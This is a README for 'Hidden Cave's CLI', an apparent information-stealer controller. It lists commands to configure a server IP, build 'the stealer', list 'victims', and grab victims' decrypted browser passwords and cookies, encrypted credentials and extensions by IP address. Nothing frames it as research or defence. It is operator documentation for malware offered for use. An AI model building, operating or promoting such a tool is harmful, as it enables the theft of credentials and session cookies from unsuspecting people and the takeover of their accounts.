# Hidden Cave's CLI

## Prerequisites
- Python (minimum 3.8)
- For building the executable the GNU Compiler Collection for windows you can download it from [winlibs](https://winlibs.com/#download-release) for linux you can use the package manager. Make sure to add the installation directory to your system path environment variable.
- Install requirements.txt `pip install -r requirements.txt`

## Usage
These are the available commands:
  - set, can be used to set needed settings.
  ```bash
  $HiddenCave-> set ip 122.1.1.2
  ```
  - load, can be used to load setting file.
  ```bash
  $HiddenCave-> load <file.json>
  ```
  - save, can be used to save setting file.
  ```bash
  $HiddenCave-> save <file.json>
  ```
  - check, can be used to check that the API is reachable and validate the cryptographic parameters.
  - build, can be used to build the stealer.
  - listv, can be used to list all victims and the grabbed data.
  - grabdata, can be used to grab victim's browser data (decrypted password and cookies).
  ```bash
  $HiddenCave-> grabdata <victim's IP address>
  ```
  - grabraw, can be used to grab victim's data (encrypted password and cookies, and extentions).
  ```bash
  $HiddenCave-> grabraw <victim's IP address>
  ```
  - clear, can be used to clear the stdout.
  - exit, can be used to exit the CLI.
  - help, can be used to display command description and usage, usage `help <command>` 

## TODO
  - Print the list of victim's as a table.
